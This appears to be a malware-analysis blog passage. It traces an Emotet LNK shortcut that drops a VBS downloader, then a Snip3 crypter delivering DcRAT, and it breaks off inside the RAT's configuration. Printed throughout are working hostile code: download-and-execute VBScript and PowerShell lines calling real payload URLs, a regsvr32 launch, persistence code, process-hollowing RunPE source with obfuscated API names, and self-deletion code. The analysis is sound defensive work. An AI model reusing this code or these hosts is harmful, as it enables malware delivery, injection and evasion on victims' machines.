US.doc.lnkDirectory : .File Size : 3.6 KiBFile Modification Date/Time : 2022:04:22 22:17:34-04:00File Access Date/Time : 2022:04:24 19:58:22-04:00File Inode Change Date/Time : 2022:04:24 19:56:34-04:00File Permissions : -rw-r--r--File Type : LNKFile Type Extension : lnkMIME Type : application/octet-streamFlags : IDList, RelativePath, CommandArgs, IconFile, UnicodeFile Attributes : (none)Target File Size : 0Icon Index : 134Run Window : NormalHot Key : (none)Target File DOS Name : cmd.exeRelative Path : ..\\..\\Windows\\system32\\cmd.exeCommand Line Arguments : /v:on /c findstr &quot;rSIPPswjwCtKoZy.*&quot; Password2.doc.lnk &amp;gt; &quot;%tmp%\\VEuIqlISMa.vbs&quot; &amp;amp; &quot;%tmp%\\VEuIqlISMa.vbs&quot;Icon File Name : shell32.dllLooking at the metadata, we can piece together the command it’ll execute by piecing together the Target File DOS Name and Command Line Arguments. Put together, it’ll spawn this command:C:\\Windows\\system32\\cmd.exe /v:on /c findstr &quot;rSIPPswjwCtKoZy.*&quot; Password2.doc.lnk &amp;gt; &quot;%tmp%\\VEuIqlISMa.vbs&quot; &amp;amp; &quot;%tmp%\\VEuIqlISMa.vbs&quot;That cmd.exe command will spawn from explorer.exe once the user clicks on the shortcut, execute a findstr to search a Password2.doc.lnk for a line that includes rSIPPswjwCtKoZy, writes that line of code to VEuIqlISMa.vbs, and then executes VEuIqlISMa.vbs. NOTE: As the LNK file is currently not named Password2.doc.lnk, the stage will not work. We’re going to continue analysis here under the assumption the adversary had gotten the naming to work properly.Analyzing the VBSWe can manually get the VBS file ourselves using a grep command in REMnux.remnux@remnux:~/cases/emotet$ grep -aF &quot;rSIPPswjwCtKoZy&quot; INV\\ 2022-04-22_1538\\,\\ US.doc.lnk &amp;gt; VEuIqlISMa.vbsremnux@remnux:~/cases/emotet$ file VEuIqlISMa.vbs VEuIqlISMa.vbs: ASCII text, with very long linesremnux@remnux:~/cases/emotet$ diec VEuIqlISMa.vbs Binary Format: plain text[LF]We successfully exported the VBS! It’s all on one line initially, but once we clean it up we can get some findings. The first half of the script is below, and it contains some overhead code and the URLs needed for downloading code.rSIPPswjwCtKoZy=1::on error resume next:Set FSO = CreateObject(&quot;Scripting.FileSystemObject&quot;)::Function Base64Decode(ByVal vCode): With CreateObject(&quot;Msxml2.DOMDocument.3.0&quot;).CreateElement(&quot;base64&quot;): .dataType = &quot;bin.base64&quot;: .text = vCode: Base64Decode = Stream_BinaryToString(.nodeTypedValue): End With:End Function::Function Stream_BinaryToString(Binary): With CreateObject(&quot;ADODB.Stream&quot;): .Type = 1: .Open: .Write Binary: .Position = 0: .Type = 2: .CharSet = &quot;utf-8&quot;: Stream_BinaryToString = .ReadText: End With:End Function::Dim JOCItJMMrs(7):::JOCItJMMrs(0) = &quot;aHR0cDovL2Z0cC5jaXBsYWZlLmNvbS5ici9BTFQvM3dkQllKZXBSVi8=&quot;::&#39; hxxp://ftp.ciplafe.com[.]br/ALT/3wdBYJepRV/JOCItJMMrs(1) = &quot;aHR0cHM6Ly9iZW5jZXZlbmRlZ2hhei5odS93cC1pbmNsdWRlcy85MHZsc1lXNUpJalov&quot;::&#39; hxxps://bencevendeghaz[.]hu/wp-includes/90vlsYW5JIjZ/JOCItJMMrs(2) = &quot;aHR0cDovL2V6bmV0Yi5zeW5vbG9neS5tZS9AZWFEaXIvd2cyQnFhV0ZSWmIxRy8=&quot;::&#39; hxxp://eznetb.synology[.]me/@eaDir/wg2BqaWFRZb1G/JOCItJMMrs(3) = &quot;aHR0cHM6Ly93d3cucmVuZWV0dGVuLm5sL2NvbnRhY3QtZm9ybXVsaWVyL3R2ekFUbkltRk1OZjIwcmM3Lw==&quot;::&#39; hxxps://www.reneetten[.]nl/contact-formulier/tvzATnImFMNf20rc7/JOCItJMMrs(4) = &quot;aHR0cDovL2Rhcmtzd29yZC5ubC9hd3N0YXRzL1pxVm5VNW9sLw==&quot;::&#39; hxxp://darksword[.]nl/awstats/ZqVnU5ol/JOCItJMMrs(5) = &quot;aHR0cDovL2RhY2VudGVjMi5sYXllcmVkc2VydmVyLmNvbS9zcGVlZHRlc3QvV2RKelFSRTlHaHZzLw==&quot;::&#39; hxxp://dacentec2.layeredserver[.]com/speedtest/WdJzQRE9Ghvs/JOCItJMMrs(6) = &quot;aHR0cDovL3ZpcC1jbGluaWMucmF6cmFib3RrYS5ieS9hYm91dF9jZW50ZXIvTE10QlRjTEgwcEgxb1BoaTkv&quot;:::&#39; hxxp://vip-clinic.razrabotka[.]by/about_center/LMtBTcLH0pH1oPhi9/The first two functions are overhead/utility functions to perform encoding conversions. The chunk of code manipulating JOCItJMMrs(7) creates an array that contains all the Emotet download URLs. These URLs are base64 encoded and you can readily decode them using CyberChef or base64 -d commands in REMnux. The second half of the script contains some obfuscation in the form of string splitting and character to decimal conversion. Once we get that reduced, it’ll look something like this:Execute( &quot;Dim Xml,WS,DB,FilepatH,URL: Xml = MSXML2.SErverXmlHtTP.3.0: WS = &quot;&quot;WsCript.SHELl: dB = &quot;&quot;adoDb.strEAM&quot;&quot;: Set SblpfvbXdq = CREATEOBJECT(WS): tMP = sblpfvBXDQ.EXpAnDEnvironmentStRIngS(&quot;&quot;%TmP%&quot;&quot;): WIndiR = SbLPFvBxdQ.expandenviroNmEntstRINgs(&quot;&quot;%WINdir%&quot;&quot;) :: filEpaTH = Tmp &amp;amp; &quot;&quot;\\VMtbfGSBow.QsJ&quot;&quot;::: cAll prog: SUb prog: RANDoMIzE: indeX = int((6 - 0 + 1)*Rnd + 0): dIm MsxMl: Set MsXmL = crEAteoBJEct(Xml): diM sTreaM: seT STReaM = CrEATEObjEct(dB): MsXmL.opeN gEt, Base64DecOde(JocITjmMrS(iNDex)), fALSE: MsXmL.setreqUEsthEaDER USer-agEnT, kykwTJBDAyBKqLonrjjG: MsXMl.senD: wIth stReAm: .tyPe = 1: .open: .WRite MsXMl.resPONseboDy: .saVetofilE FilEPath, 2: end wiTh: EnD SUB&quot;)::SBLpFvbXDQ.Exec(windir &amp;amp; &quot;\\System32\\regsvR32.ExE &quot; &amp;amp; tmp &amp;amp; Base64Decode(&quot;XHZtVGJmR1NCT1cucXNq&quot;)):&#39; \\vmTbfGSBOW.qsjFSO.GetFile(WScript.ScriptFullName).deleteThis chunk of code takes VBScript pass into Execute() as a string and executes it. That code randomly picks an element of the JocITjmMrS(7) array, attempts to download content (presumably a DLL) from that URL to vmTbfGSBOW.qsj, and executes the downloaded content with regsvr32.exe. Afterward, the script deletes itself from disk. One very odd detail in this script is that the adversary chooses to specify a User-Agent string of kykwTJBDAyBKqLonrjjG. This may be something designed to gate access or keep track of statistics since UA strings can be arbitrary and optional.To summarize so far: explorer.exe spawns cmd.exe with the findstr command to write the VBS cmd.exe spawns wscript.exe VEuIqlISMa.vbs wscript.exe contacts one of 7 URLs to download a DLL wscript.exe writes the DLL to vmTbfGSBOW.qsj wscript.exe executes regsvr32.exe vmTbfGSBOW.qsj wscript.exe removes VEuIqlISMa.vbs from diskTriage the downloaded DLLFrom here the threat converges to a traditional Emotet infection via DLL. Before I stop for the evening I still want to triage the DLL a bit and see if we can generate some hypotheses.remnux@remnux:~/cases/emotet$ file vmTbfGSBOW.qsj vmTbfGSBOW.qsj: PE32+ executable (DLL) (GUI) x86-64, for MS Windowsremnux@remnux:~/cases/emotet$ diec vmTbfGSBOW.qsj PE64 Library: MFC(-)[static] Compiler: Microsoft Visual C++(2005)[-] Linker: Microsoft Linker(8.0 or 11.0)[DLL64]It looks like the file is a 64-bit Windows DLL. Let’s get those hashes:remnux@remnux:~/cases/emotet$ pehash vmTbfGSBOW.qsj file filepath: vmTbfGSBOW.qsj md5: 87531dab200c392f33d0d9c18abf53c0 sha1: 82412da65a6638050344b87784c8a7ec4468fe58 sha256: 3c9b05b81bf7f6e7864527c03f5ed8c87c9c7ebab58a58d1766fd439f2740ce8 ssdeep: 12288:C1FIcocJwMTHzXO7N2OBHiyzskF1CubVnmn:tco9MTHzXO7N7/115mn imphash: 6ba79cbed2acbe9b8ecc8e14a572f100I also like to get rich header hashes for pivoting with VT Enterprise/Intelligence, and you can do the same using Python and the pefile library.import pefilebinary = pefile.PE(&#39;vmTbfGSBOW.qsj&#39;)binary.get_rich_header_hash()&#39;e47802314222a55b74fe99a752e0b658&#39;With the imphash we can pivot in VT to find files with similar capabilities, with the rich header hash we can pivot in VT to find files with similar build environments. The final thing I want to do tonight is get an idea of the DLL’s capabilities using capa.remnux@remnux:~/cases/emotet$ capa vmTbfGSBOW.qsj +------------------------+------------------------------------------------------------------------------------+| md5 | 87531dab200c392f33d0d9c18abf53c0 || sha1 | 82412da65a6638050344b87784c8a7ec4468fe58 || sha256 | 3c9b05b81bf7f6e7864527c03f5ed8c87c9c7ebab58a58d1766fd439f2740ce8 || path | vmTbfGSBOW.qsj |+------------------------+------------------------------------------------------------------------------------++------------------------+------------------------------------------------------------------------------------+| ATT&amp;amp;CK Tactic | ATT&amp;amp;CK Technique ||------------------------+------------------------------------------------------------------------------------|| COLLECTION | Input Capture::Keylogging T1056.001 || DEFENSE EVASION | Modify Registry:: T1112 || | Obfuscated Files or Information::Indicator Removal from Tools T1027.005 || EXECUTION | Shared Modules:: T1129 |+------------------------+------------------------------------------------------------------------------------++-----------------------------+-------------------------------------------------------------------------------+| MBC Objective | MBC Behavior ||-----------------------------+-------------------------------------------------------------------------------|| ANTI-STATIC ANALYSIS | Disassembler Evasion::Argument Obfuscation [B0012.001] || COLLECTION | Keylogging::Polling [F0002.002] || DISCOVERY | Application Window Discovery::Window Text [E1010.m01] || MEMORY | Allocate Memory:: [C0007] || OPERATING SYSTEM | Registry::Create Registry Key [C0036.004] || | Registry::Delete Registry Key [C0036.002] || | Registry::Open Registry Key [C0036.003] |+-----------------------------+-------------------------------------------------------------------------------++------------------------------------------------------+------------------------------------------------------+| CAPABILITY | NAMESPACE ||------------------------------------------------------+------------------------------------------------------|| contain obfuscated stackstrings | anti-analysis/obfuscation/string/stackstring || log keystrokes via polling | collection/keylog || contain a resource (.rsrc) section | executable/pe/section/rsrc || extract resource via kernel32 functions (3 matches) | executable/resource || get graphical window text | host-interaction/gui/window/get-text || allocate RWX memory | host-interaction/process/inject || create or open registry key | host-interaction/registry || delete registry key | host-interaction/registry/delete || link function at runtime (4 matches) | linking/runtime-linking || link many functions at runtime | linking/runtime-linking || parse PE exports | load-code/pe || parse PE header (6 matches) | load-code/pe |+------------------------------------------------------+------------------------------------------------------+There are a decent number of capabilities listed but I want to zoom in on a few that may make further static analysis difficult: contains obfuscated stackstrings link functions at runtime parse PE header/exportsThe obfuscated stackstrings will slow static analysis a bit while the analyst figures out what the strings are supposed to say. The function linking at runtime means that we can’t easily catalog all the capabilities of the DLL using its import table. Once it starts using something like LoadLibrary and GetProcAddress to manually resolve other imports the sample will get more complicated quickly. Finally, PE header and export parsing isn’t always a sign of more difficulties, but it can indicate the sample is designed to unpack a second PE and write it into memory for execution. From here the best path for me will be dynamic analysis in a sandbox for further analysis.Why a LNK shortcut?Before winding down for the night, I want to address one question: “Why would an adversary use LNK files?”Shortcut files present an interesting opportunity compared to other deployment options. Consider MS Office files and the macros therein. As more adversaries have used macros, Microsoft has clamped down and allowed more security controls around macros to make them less useful to adversaries. As more organizations adopt controls to limit macros, adversaries become less effective. Consider script files like VBS, JS, and MSHTA files. Organizations can mitigate against adversaries using these files by disabling their default file handler associations or replacing it with Notepad. Such a change won’t significantly hinder IT operations in most organizations, and it keeps users from double-clicking to execute malware.Shortcut files are specifically designed to be double-clicked for execution. You can’t really block them easily because doing so would significantly interfere with normal desktop and start menu shortcuts. You can easily change their icons to show whatever image you want, you can specify whatever commands in their metadata you want, and you can easily append data to a shortcut without interfering with its operation. This is a ready-made set of circumstances that allow easy exploitation. Many other adversaries have also explored using LNK files to great effect, including adversaries deploying IcedID and Bumblebee malware.Thanks for reading!" }, { "title": "Snip3 Crypter used with DCRat via VBScript", "url": "/snip3-crypter-dcrat-vbs/", "categories": "malware", "tags": "malware, dcrat, vbscript, snip3", "date": "2022-04-16 00:00:00 +0000", "snippet": "Adversaries love using free or cheap RATs or stealers, and I see a lot of RATs such as AsyncRAT during my daily malware analysis tasks. In this detection I want to examine a fairly recent sample from in MalwareBazaar that involves Snip3 crypter and DcRAT, an AsyncRAT clone. If you want to follow along at home, the sample is available here in MalwareBazaar: https://bazaar.abuse.ch/sample/78a742710aa79e0574a6faefecfaf851b64043889e75768f5de091cfc5a21dc0/.Analyzing the first stageJumping into the analysis of the first stage, we can see the code is VBScript. Some of the code includes Dim keywords, and that’s usually an easy way to tell. The grand majority of the code in the script is responsible for some form of obfuscation and the only real important parts are the obj.Add, which eventually translates into a WScript.shell call, and the Camtasia variable, which reduces down to PowerShell code after some text replacement.Set obj = CreateObject(&quot;Scripting.Dictionary&quot;)obj.Add &quot;W&quot;, &quot;Apple&quot;obj.Add &quot;S&quot;, &quot;Bluetooth&quot;obj.Add &quot;c&quot;, &quot;Clear&quot;obj.Add &quot;r&quot;, &quot;Orange&quot;obj.Add &quot;i&quot;, &quot;Application&quot;obj.Add &quot;p&quot;, &quot;Windows&quot;obj.Add &quot;t&quot;, &quot;Linux&quot;obj.Add &quot;.&quot;, &quot;Ubuntu&quot;obj.Add &quot;s&quot;, &quot;Building&quot;obj.Add &quot;h&quot;, &quot;Car&quot;obj.Add &quot;e&quot;, &quot;Book&quot;obj.Add &quot;l&quot;, &quot;SmartPhone&quot;obj.Add &quot;L&quot;, &quot;Computer&quot;Dim Keys, WSKeys = obj.KeysFor Each K In Keys WS = WS &amp;amp; KNextDim CamtasiaCamtasia = &quot;金Ｚ難月竹大中心口田手尸［；、/一山女弓人竹廿弓[金Ｚ難月竹大中心口田手尸［；、/一山女弓人竹廿弓S...&quot;Camtasia = Replace(Camtasia, &quot;金Ｚ難月竹大中心口田手尸［；、/一山女弓人竹廿弓&quot;, &quot;&quot;)Set Lenovo = GetObject(&quot;&quot;, WS)obj.RemoveAll()Dim NvidiaNvidia = &quot;PowerShell -ExecutionPolicy RemoteSigned -Command &quot;Lenovo.Run Nvidia &amp;amp; Camtasia, 0I’ve reduced the amount of code for brevity but in the full sample there is a large chunk of non-English Unicode characters that eventually get removed to produce this PowerShell code:[System.Net.WebClient] $Client = New-Object System.Net.WebClient; [Byte[]] $DownloadedData = $Client.DownloadData(&#39;hxxps://textbin[.]net/raw/mevlbkxshp&#39;); [String] $ByteToString = [System.Text.UTF8Encoding]::UTF8.GetString($DownloadedData); [System.IO.File]::WriteAllText(&#39;C:\\Users\\Public\\mevlbkxshp.PS1&#39;, $ByteToString, [System.Text.Encoding]::UTF8); Invoke-Expression &#39;PowerShell -ExecutionPolicy RemoteSigned -File C:\\Users\\Public\\mevlbkxshp.PS1&#39;The PowerShell code is designed to download the next stage from hxxps://textbin[.]net/raw/mevlbkxshp, write the contents to disk as mevlbkxshp.PS1 and then executing the script. It’s simple and straightforward with just the single purpose. The fun comes in the next stage!Analyzing the second stageThe second stage downloaded from textbin[.]net contains a lot of code that is encoded in decimal or URL encoding. The first part of the script containsAdd-Type -AssemblyName System.Windows.FormsAdd-Type -AssemblyName Microsoft.VisualBasicAdd-Type -AssemblyName Microsoft.CSharpAdd-Type -AssemblyName System.ManagementAdd-Type -AssemblyName System.Web[Byte[]] $RUNPE = @(31,139,8,0,0,0,0,0,4,0,...)Function INSTALL() { [String] $VBSRun = [System.Text.Encoding]::Default.GetString(@(83,101,116,32,79,98,106,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,87,83,99,114,105,112,116,46,83,104,101,108,108,34,41,13,10,79,98,106,46,82,117,110,32,34,80,111,119,101,114,83,104,101,108,108,32,45,69,120,101,99,117,116,105,111,110,80,111,108,105,99,121,32,82,101,109,111,116,101,83,105,103,110,101,100,32,45,70,105,108,101,32,34,32,38,32,34,37,70,105,108,101,80,97,116,104,37,34,44,32,48)) [System.IO.File]::WriteAllText(([System.Environment]::GetFolderPath(7) + &quot;\\&quot; + &quot;MicroSoftOutlookLauncher.vbs&quot;), $VBSRun.Replace(&quot;%FilePath%&quot;, $PSCommandPath))}Function Decompress { [CmdletBinding()] Param ( [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)] [byte[]] $byteArray = $(Throw(&quot;-byteArray is required&quot;)) ) Process { $input = New-Object System.IO.MemoryStream( , $byteArray ) $output = New-Object System.IO.MemoryStream $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress) $gzipStream.CopyTo( $output ) $gzipStream.Close() $input.Close() [byte[]] $byteOutArray = $output.ToArray() return $byteOutArray }}This chunk of code defines some of the overhead boilerplate code involved with the Snip3 crypter. The $RUNPE variable contains decimal-encoded, gzip-compressed chunk of C# code. The INSTALL() function writes a bare minimum bit of code to disk to execute this downloaded code in the future. The Decompress() function inflates the compression on $RUNPE later down the line to make it usable. The second chunk of the script contains loads of additional boilerplate code from Snip3 designed to compile the RunPE code in memory, make the bare minimum of evidence on disk, and then load the generated RunPE assembly into memory.function CodeDom([Byte[]] $BB, [String] $TP, [String] $MT) {$dictionary = new-object &#39;System.Collections.Generic.Dictionary[[string],[string]]&#39;$dictionary.Add(&quot;CompilerVersion&quot;, &quot;v4.0&quot;)$CsharpCompiler = New-Object Microsoft.CSharp.CSharpCodeProvider($dictionary)$CompilerParametres = New-Object System.CodeDom.Compiler.CompilerParameters$CompilerParametres.ReferencedAssemblies.Add(&quot;System.dll&quot;)$CompilerParametres.ReferencedAssemblies.Add(&quot;System.Management.dll&quot;)$CompilerParametres.ReferencedAssemblies.Add(&quot;System.Windows.Forms.dll&quot;)$CompilerParametres.ReferencedAssemblies.Add(&quot;mscorlib.dll&quot;)$CompilerParametres.ReferencedAssemblies.Add(&quot;Microsoft.VisualBasic.dll&quot;)$CompilerParametres.IncludeDebugInformation = $false$CompilerParametres.GenerateExecutable = $false$CompilerParametres.GenerateInMemory = $true$CompilerParametres.CompilerOptions += &quot;/platform:X86 /unsafe /target:library&quot;$BB = Decompress($BB)[System.CodeDom.Compiler.CompilerResults] $CompilerResults = $CsharpCompiler.CompileAssemblyFromSource($CompilerParametres, [System.Text.Encoding]::Default.GetString($BB))[Type] $T = $CompilerResults.CompiledAssembly.GetType($TP)[Byte[]] $Bytes = [System.Web.HttpUtility]::UrlDecodeToBytes([Microsoft.VisualBasic.Strings]::StrReverse(&#39;00%00%00...&#39;))The $CSharpCompiler and $CompilerParametres variables hold objects and parameters around C# code compilation. When this code executes, you’ll see PowerShell spawning one or more csc.exe processes to convert the code into an executable assembly. The last variable $Bytes holds the adversary’s payload that Snip3 crypter protects during deployment. The payload is embedded within the script as bytes that are URL encoded and reversed afterward. We can easily obtain the original payload by executing the line of PowerShell storing the payload into $Bytes and then using Set-Content to write the content to disk. We can also obtain the RunPE code by doing the same with passing $RUNPE through Decompress() before writing the contents to disk using Set-Content. The final chunk of code is responsible for calling the RunPE injection code, telling it to spawn regsvcs.exe, and inject the final payload $Bytes into the memory space of regsvcs.exe.try{[String] $MyPt = [System.IO.Path]::Combine([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory(),&quot;RegSvcs.exe&quot;)[Object[]] $Params=@($MyPt.Replace(&quot;Framework64&quot;,&quot;Framework&quot;) ,$Bytes)return $T.GetMethod($MT).Invoke($null, $Params)} catch { }}INSTALL[System.Threading.Thread]::Sleep(1000)CodeDom $RUNPE &quot;GIT.Repository&quot; &quot;Execute&quot;From here there are two paths we can branch into for our investigation: exploring Snip3 and exploring the final payload. The first path we’re going to take is exploring Snip3.Examining Snip3’s codeThe entry point invoked in the Snip3 code is [GIT.Repository]::Execute. The code is slightly obfuscated in some places but the variable names are extremely self-explanatory.namespace GIT{ public sealed class Repository { public static void Execute(string path, byte[] payload) { for (int i = 0; i &amp;lt; 5; i++) { int readWrite = 0x0; NativeMethods.StartupInformation si = new NativeMethods.StartupInformation(); NativeMethods.ProcessInformation pi = new NativeMethods.ProcessInformation(); si.Size = (UInt32)(Marshal.SizeOf(typeof(NativeMethods.StartupInformation))); //Attention ! try { bool createProc = NativeMethods.CreateProcessA(path, &quot;&quot;, IntPtr.Zero, IntPtr.Zero, false, 0x00000004 | 0x08000000, IntPtr.Zero, null, ref si, ref pi); if (!createProc) { throw new Exception(); } ... if (imageBase == baseAddress) { if (NativeMethods.ZwUnmapViewOfSection(pi.ProcessHandle, baseAddress) != 0) { throw new Exception(); } } ... bool writeProcessMemory = NativeMethods.WriteProcessMemory(pi.ProcessHandle, newImageBase, payload, sizeOfHeaders, ref readWrite); if (!writeProcessMemory) { throw new Exception(); }Some of the structure and variable names reference Windows API methods used during process hollowing injection. These include WriteProcessMemory, ZwUnmapViewOfSection, and CreateProcessA. While the structure and variable names are self-explanatory, the process of those names getting attached to the actual API calls is slightly more obfuscated. This can be seen in Helper struct. Each of the API calls and DLL names required are stored as an integer array that must be decoded in a later function. public struct Helper { public static int[] Kernel32 = new int[] { 3105607, 3104713, 3106650, 3106054, 3104713, 3105756, 3097263, 3097114 }; public static int[] NtDLL = new int[] { 3106054, 3106948, 3104564, 3105756, 3105756 }; public static int[] ResumeThread = new int[] { 3101882, 3104713, 3106799, 3107097, 3105905, 3104713, 3102180, 3105160, 3106650, 3104713, 3104117, 3104564 }; public static int[] Wow64SetThreadContext = new int[] { 3102627, 3106203, 3107395, 3097710, 3097412, 3102031, 3104713, 3106948, 3102180, 3105160, 3106650, 3104713, 3104117, 3104564, 3099647, 3106203, 3106054, 3106948, 3104713, 3107544, 3106948 }; public static int[] SetThreadContext = new int[] { 3102031, 3104713, 3106948, 3102180, 3105160, 3106650, 3104713, 3104117, 3104564, 3099647, 3106203, 3106054, 3106948, 3104713, 3107544, 3106948 }; public static int[] Wow64GetThreadContext = new int[] { 3102627, 3106203, 3107395, 3097710, 3097412, 3100243, 3104713, 3106948, 3102180, 3105160, 3106650, 3104713, 3104117, 3104564, 3099647, 3106203, 3106054, 3106948, 3104713, 3107544, 3106948 }; public static int[] GetThreadContext = new int[] { 3100243, 3104713, 3106948, 3102180, 3105160, 3106650, 3104713, 3104117, 3104564, 3099647, 3106203, 3106054, 3106948, 3104713, 3107544, 3106948 }; public static int[] VirtualAllocEx = new int[] { 3102478, 3105309, 3106650, 3106948, 3107097, 3104117, 3105756, 3099349, 3105756, 3105756, 3106203, 3104415, 3099945, 3107544 }; public static int[] WriteProcessMemory = new int[] { 3102627, 3106650, 3105309, 3106948, 3104713, 3101584, 3106650, 3106203, 3104415, 3104713, 3106799, 3106799, 3101137, 3104713, 3105905, 3106203, 3106650, 3107693 }; public static int[] ReadProcessMemory = new int[] { 3101882, 3104713, 3104117, 3104564, 3101584, 3106650, 3106203, 3104415, 3104713, 3106799, 3106799, 3101137, 3104713, 3105905, 3106203, 3106650, 3107693 }; public static int[] ZwUnmapViewOfSection = new int[] { 3103074, 3107395, 3102329, 3106054, 3105905, 3104117, 3106352, 3102478, 3105309, 3104713, 3107395, 3101435, 3104862, 3102031, 3104713, 3104415, 3106948, 3105309, 3106203, 3106054 }; public static int[] CreateProcessA = new int[] { 3099647, 3106650, 3104713, 3104117, 3106948, 3104713, 3101584, 3106650, 3106203, 3104415, 3104713, 3106799, 3106799, 3099349 }; }The API mapping to structure name process is handled by code from this NativeMethods class in the crypter. During the mapping process the class calls Decode.BytesToString() in another class to finish translating each integer array to a string needed for the API. public abstract class NativeMethods { private const string Key = &quot;QoMn4OhGfV+oHNb8AzV==&quot;; public delegate int DelegateResumeThread(IntPtr handle); public delegate bool DelegateWow64SetThreadContext(IntPtr thread, int[] context); public delegate bool DelegateSetThreadContext(IntPtr thread, int[] context); public delegate bool DelegateWow64GetThreadContext(IntPtr thread, int[] context); public delegate bool DelegateGetThreadContext(IntPtr thread, int[] context); public delegate int DelegateVirtualAllocEx(IntPtr handle, int address, int length, int type, int protect); public delegate bool DelegateWriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten); public delegate bool DelegateReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead); public delegate int DelegateZwUnmapViewOfSection(IntPtr process, int baseAddress); public delegate bool DelegateCreateProcessA(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation); public static readonly DelegateResumeThread ResumeThread = LoadApi&amp;lt;DelegateResumeThread&amp;gt;(Decode.BytesToString(Decode.IntegerToBytes(Helper.Kernel32, Key)), Decode.BytesToString(Decode.IntegerToBytes(Helper.ResumeThread, Key))); public static readonly DelegateWow64SetThreadContext Wow64SetThreadContext = LoadApi&amp;lt;DelegateWow64SetThreadContext&amp;gt;(Decode.BytesToString(Decode.IntegerToBytes(Helper.Kernel32, Key)), Decode.BytesToString(Decode.IntegerToBytes(Helper.Wow64SetThreadContext, Key)));...How do we know it’s Snip3?There are multiple different crypter products that adversaries might choose. Other crypters tend to include a DLL injection component embedded in a PowerShell script, but Snip3 is the only one I’ve run across that distributes its injection component as raw C# source and compiled it on the victim host. There are also code overlaps with this blog post from Morphisec. Pretty much the majority of the CodeDom() and INSTALL() functions overlapped with the code seen by Morphisec.Identifying the final payload (DcRAT)Threats mixed with a crypter in this manner are often difficult to identify. This is largely because the final payload never gets written to disk in plaintext during execution. Most of the time the final payloads I see are RATs and stealers. Now that we’ve extracted the payload from the crypter component, we can explore what the payload is.A good first step is to triage the binary with diec.remnux@remnux:~/cases/dcrat-snip3$ diec payload.exe PE32 Library: .NET(v4.0.30319)[-] Compiler: VB.NET(-)[-] Linker: Microsoft Linker(8.0)[GUI32]Detect-It-Easy thinks we’re looking at a .NET executable compiled using VB.NET. That said, we can try to decompile the executable using ilspycmd.remnux@remnux:~/cases/dcrat-snip3$ ilspycmd payload.exe &amp;gt; payload.decompiled.csremnux@remnux:~/cases/dcrat-snip3$ head payload.decompiled.cs using System;using System.Collections;using System.Collections.Generic;using System.Diagnostics;using System.Drawing.Imaging;using System.IO;using System.IO.Compression;using System.Linq;using System.Management;using System.Net;Awesome, it looks like we have some valid source code! Inside the source I tend to look for a few things. First, I look for obfuscation. In this sample, it doesn’t look like we have any at all. We can tell this by looking for strings, function names, and variable names.FileStream fileStream = new FileStream(((FileSystemInfo)val).get_FullName(), FileMode.CreateNew);byte[] array = File.ReadAllBytes(fileName);fileStream.Write(array, 0, array.Length);Methods.ClientOnExit();string text = Path.GetTempFileName() + &quot;.bat&quot;;using (StreamWriter streamWriter = new StreamWriter(text)){ streamWriter.WriteLine(&quot;@echo off&quot;); streamWriter.WriteLine(&quot;timeout 3 &amp;gt; NUL&quot;); streamWriter.WriteLine(&quot;START \\&quot;\\&quot; \\&quot;&quot; + ((FileSystemInfo)val).get_FullName() + &quot;\\&quot;&quot;); streamWriter.WriteLine(&quot;CD &quot; + Path.GetTempPath()); streamWriter.WriteLine(&quot;DEL \\&quot;&quot; + Path.GetFileName(text) + &quot;\\&quot; /f /q&quot;);}ProcessStartInfo val5 = new ProcessStartInfo();val5.set_FileName(text);val5.set_CreateNoWindow(true);val5.set_ErrorDialog(false);val5.set_UseShellExecute(false);val5.set_WindowStyle((ProcessWindowStyle)1);Process.Start(val5);Environment.Exit(0);The chunk of code above writes a timeout and deletion command to a Batch script file and then executes it. This is usually a self-deletion measure for RATs and stealers. If obfuscation was involved in this sample, very little of the code above would be readable. The strings would likely be scrambled as would the variable names. In some cases of obfuscation, adversaries may even try to use non-English Unicode characters to make the code unreadable.The next thing I tend to look for is some form of a settings/configuration block. We can find this relatively early in the decompiled code:public static class Settings{ public static string Por_ts = &quot;usFKhAwZB0s5E032xkSVfg7l+Ch91dfu+A08UlFLF49Q30Ft0dZAYmucm8sTGi/dwaJ+M3FgfdYZ8cPP8D1V+w==&quot;; public static string Hos_ts = &quot;F09WwBBWBuVtFrk9Sq585p4pSPXpOKP4VsaBWaqfQ9X6FBhLlsklmDXupr4ISZVUh6yZXGtWnOMqJJK+ObQwpRK6tzgcdVgAEslPhlbKSzQ=&quot;; public static string Ver_sion = &quot;yt5wqjF7PeriwF2ATQgo1qaGu8ohghvvWFdY7y7X0C5deqcnj9VHSiD4wq7X5aEN+1P6NP9WYGQQIAbd9kf3lA==&quot;; public static string In_stall = &quot;2t2u9kfC5A1rQP6SZhw4iizbdOd43zK972n9x0JBS1pGDDenkZU0OJAiJeJkrkStNij5dIdB9czAC+W70P4YFg==&quot;; public static string Install_Folder = &quot;%AppData%&quot;; public static string Install_File = &quot;&quot;; public static string Key = &quot;MnB2MzZTUFI4bTFFZXNVUW1tdlI0bFJ1blNMUUZIbk4=&quot;; public static string MTX = &quot;jswrBrmmYlOHF153N6vUcJ18KLbBZCuS9UMeDq2PFEF4OMujEGd96QJnoQXKp+uYbf/MH9tlXkezr+SQPtOInOpodPFxZKzrM4H0FLhzg9s=&quot;; public static string Certifi_cate = 